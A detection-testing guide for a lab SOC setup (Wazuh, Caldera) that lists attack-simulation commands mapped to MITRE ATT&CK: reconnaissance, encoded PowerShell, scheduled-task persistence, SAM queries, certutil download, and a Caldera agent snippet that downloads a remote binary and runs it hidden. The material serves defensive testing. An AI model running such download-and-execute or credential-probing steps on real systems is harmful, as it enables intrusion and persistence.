# Attack Scenarios

## Overview

This document provides attack scenarios for testing and validating the SOC-in-a-Box detection capabilities. Each scenario maps to MITRE ATT&CK techniques and demonstrates end-to-end threat detection.

---

## Scenario 1: PowerShell-Based Attack Chain

### Objective
Simulate a PowerShell-based attack demonstrating multiple MITRE ATT&CK techniques

### MITRE ATT&CK Techniques
- T1059.001 - PowerShell
- T1082 - System Information Discovery
- T1016 - System Network Configuration Discovery
- T1053.005 - Scheduled Task/Job
- T1547.001 - Registry Run Keys

### Attack Steps

**Step 1: Reconnaissance**
```powershell
# Execute on Windows endpoint
systeminfo
whoami /all
hostname
```
**Expected Detection**: Rule 100070 - System Information Discovery

---

**Step 2: Encoded PowerShell Execution**
```powershell
# Base64 encoded command (harmless - just writes text)
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGkAcwAgAGEAIAB0AGUAcwB0ACIA
```
**Expected Detection**: Rule 100010 - Encoded PowerShell Command

---

**Step 3: Suspicious PowerShell Flags**
```powershell
powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Write-Host 'Test'"
```
**Expected Detection**: Rule 100011 - Suspicious PowerShell Execution Flags

---

**Step 4: Network Discovery**
```powershell
ipconfig /all
netstat -an
arp -a
route print
```
**Expected Detection**: Rule 100071 - Network Reconnaissance

---

**Step 5: Scheduled Task Persistence**
```powershell
schtasks /create /tn "UpdateTask" /tr "powershell.exe -Command 'Write-Host Test'" /sc daily /st 12:00 /f

# Clean up
schtasks /delete /tn "UpdateTask" /f
```
**Expected Detection**: Rule 100031/100032 - Scheduled Task Creation

---

**Step 6: Registry Persistence (Query only - safe)**
```powershell
# Query registry run keys
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```
**Expected Detection**: Low-level activity, logged for correlation

---

### Validation

Check Wazuh for these alerts:
1. Navigate to https://localhost:443
2. Go to "Security Events"
3. Filter by last 15 minutes
4. Look for MITRE techniques: T1059.001, T1082, T1016, T1053.005

### Expected Alert Count
- 6-8 alerts from this scenario
- Severity levels ranging from 6 (Low) to 12 (High)

---

## Scenario 2: Credential Access Simulation

### Objective
Test credential access detection capabilities

### MITRE ATT&CK Techniques
- T1003.002 - OS Credential Dumping: SAM
- T1110.001 - Brute Force
- T1003.001 - LSASS Memory (simulated)

### Attack Steps

**Step 1: SAM Registry Query (Will Fail - Expected)**
```powershell
# Attempt to query SAM (will be denied, but logged)
reg query "HKLM\SAM" 2>$null
reg query "HKLM\SYSTEM" 2>$null
```
**Expected Detection**: Rule 100062 - SAM Database Access Attempt

---

**Step 2: Credential Manager Enumeration**
```powershell
cmdkey /list
```
**Expected Detection**: Logged as discovery activity

---

**Step 3: Simulate Brute Force (Safe - Local Only)**
```powershell
# This will fail but generate logs
1..3 | ForEach-Object {
    runas /user:nonexistentuser "cmd.exe" 2>$null
}
```
**Expected Detection**: Rule 100063 - Multiple Failed Login Attempts (requires 5+ failures)

---

### Validation

Expected Wazuh Alerts:
- Registry access to SAM
- Authentication failures
- Severity: 12-14 (High to Critical)

---

## Scenario 3: Lateral Movement Indicators

### Objective
Detect lateral movement techniques

### MITRE ATT&CK Techniques
- T1021.002 - Remote Services: SMB/Windows Admin Shares
- T1018 - Remote System Discovery
- T1047 - Windows Management Instrumentation

### Attack Steps

**Step 1: Network Enumeration**
```powershell
net view
net view /domain
net group "Domain Computers" /domain 2>$null
```
**Expected Detection**: Rule 100072 - Domain/Network Enumeration

---

**Step 2: Admin Share Discovery**
```powershell
net share
net use
```
**Expected Detection**: Logged for correlation

---

**Step 3: WMI Query (Local)**
```powershell
wmic process list brief
wmic service get name,startmode
```
**Expected Detection**: Rule 100021 - WMI Execution (if process creation attempted)

---

### Validation

Check for:
- Discovery technique alerts (T1018)
- Low to medium severity (6-10)
- Multiple correlated events

---

## Scenario 4: Defense Evasion

### Objective
Test defense evasion detection

### MITRE ATT&CK Techniques
- T1027 - Obfuscated Files
- T1562.001 - Impair Defenses (Defender)

### Attack Steps

**Step 1: Certutil Download (Simulated)**
```powershell
# Certutil abuse for download (safe URL)
certutil -urlcache -split -f "http://example.com/test.txt" C:\temp\test.txt 2>$null

# Clean up
Remove-Item C:\temp\test.txt -Force -ErrorAction SilentlyContinue
```
**Expected Detection**: Rule 100053 - Certutil Abuse

---

**Step 2: Check Windows Defender Status (Read-Only)**
```powershell
Get-MpPreference | Select-Object DisableRealtimeMonitoring
Get-MpComputerStatus
```
**Expected Detection**: Logged activity

---

### Validation

Expected alerts:
- Certutil abuse detection
- Severity: 10-12

---

## Scenario 5: Ransomware Indicators

### Objective
Detect ransomware preparation techniques

### MITRE ATT&CK Techniques
- T1490 - Inhibit System Recovery
- T1486 - Data Encrypted for Impact

### Attack Steps

**⚠️ WARNING: DO NOT run actual shadow copy deletion commands in production!**

**Step 1: Check Shadow Copies (Safe - Read Only)**
```powershell
vssadmin list shadows
```
**Expected Detection**: Logged activity, monitoring for next step

---

**Step 2: Archive File Creation**
```powershell
# Create test files
"Test data" | Out-File C:\temp\test1.txt
"Test data" | Out-File C:\temp\test2.txt

# Create password-protected archive
Compress-Archive -Path C:\temp\test*.txt -DestinationPath C:\temp\testarchive.zip

# Clean up
Remove-Item C:\temp\test*.txt -Force
Remove-Item C:\temp\testarchive.zip -Force
```
**Expected Detection**: Rule 100090 - Archive Creation (if password-protected)

---

### Validation

Ransomware indicators should be HIGH severity alerts.

---

## Scenario 6: Caldera Automated Attack

### Objective
Use Caldera to execute a full attack chain automatically

### Prerequisites
1. Caldera running at http://localhost:8888
2. Caldera agent deployed on Windows victim
3. Agent showing as "trusted" in Caldera

### Execution Steps

**Step 1: Deploy Caldera Agent**

```powershell
# On Windows victim (PowerShell as Admin)
# Get the agent deployment command from Caldera UI

# Example (replace with actual server IP):
$server="http://YOUR_IP:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data)
Start-Process -FilePath "C:\Users\Public\$name" -ArgumentList "-server $server -group red" -WindowStyle Hidden
```

---

**Step 2: Create Operation in Caldera**

1. Go to http://localhost:8888
2. Click "Operations"
3. Click "+ Create Operation"
4. Configure:
   - Name: `SOC-Test-Discovery`
   - Adversary: **Discovery** (safest option)
   - Agent Group: `red`
   - Fact Source: `basic`
5. Click "Start"

---

**Step 3: Monitor Execution**

In Caldera, watch the operation progress. You'll see abilities executing:
- System information collection (T1082)
- Network configuration discovery (T1016)
- Process discovery (T1057)
- File and directory discovery (T1083)

---

**Step 4: Validate Detection**

In Wazuh:
1. Go to Security Events
2. Filter: Last 30 minutes
3. Look for alerts from the victim host
4. Verify MITRE ATT&CK techniques detected

Expected detections:
- T1082 - System Information Discovery
- T1016 - Network Configuration Discovery
- T1057 - Process Discovery
- Multiple alerts, severity 6-10

---

**Step 5: Cleanup**

```powershell
# Stop and remove Caldera agent
Get-Process sandcat* | Stop-Process -Force
Remove-Item C:\Users\Public\sandcat* -Force
```

---

### Advanced Caldera Operations

**Credential Access Adversary** (Riskier):
- Attempts credential dumping
- Should trigger CRITICAL alerts
- Use only in isolated lab

**Persistence Adversary**:
- Creates scheduled tasks
- Modifies registry
- Should trigger multiple HIGH severity alerts

---

## Validation Checklist

After running scenarios, verify:

- [ ] Wazuh generated expected alerts
- [ ] MITRE ATT&CK techniques are tagged
- [ ] Alert severity levels are appropriate
- [ ] Alerts contain sufficient detail for investigation
- [ ] (Optional) TheHive cases were created via Shuffle
- [ ] (Optional) Cortex enrichment occurred
- [ ] No false negatives (missed detections)

---

## Creating Custom Scenarios

### Template

```markdown
## Scenario X: [Name]

### Objective
[What you're testing]

### MITRE ATT&CK Techniques
- TXXXX.XXX - [Technique name]

### Attack Steps

**Step 1: [Description]**
```powershell
# Command
```
**Expected Detection**: Rule XXXXX - [Description]

[Repeat for each step]

### Validation
[How to verify detection worked]
```

---

## Safety Guidelines

**Always**:
- ✅ Run in isolated lab environment
- ✅ Use test/dummy data
- ✅ Document all activities
- ✅ Clean up after testing
- ✅ Validate detections

**Never**:
- ❌ Run on production systems
- ❌ Use real credentials
- ❌ Actually damage systems
- ❌ Delete shadow copies for real
- ❌ Disable actual security controls

---

## Troubleshooting

### No Alerts Generated

**Check**:
1. Wazuh agent is connected: `docker exec -it wazuh.manager /var/ossec/bin/agent_control -l`
2. Sysmon is running: `Get-Service Sysmon64`
3. Custom rules are loaded: `docker exec -it wazuh.manager cat /var/ossec/etc/rules/custom_rules.xml`
4. Logs are flowing: `docker exec -it wazuh.manager tail -f /var/ossec/logs/ossec.log`

### Alerts Not in Dashboard

**Check**:
- Wazuh Indexer is running
- Time range filter in dashboard
- Agent filter settings

### False Positives

**Tuning**:
- Adjust rule levels
- Add exceptions for legitimate activity
- Tune regex patterns
- Correlate multiple events

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [MITRE Caldera](https://github.com/mitre/caldera)
- [Wazuh Detection Rules](https://documentation.wazuh.com/current/user-manual/ruleset/index.html)
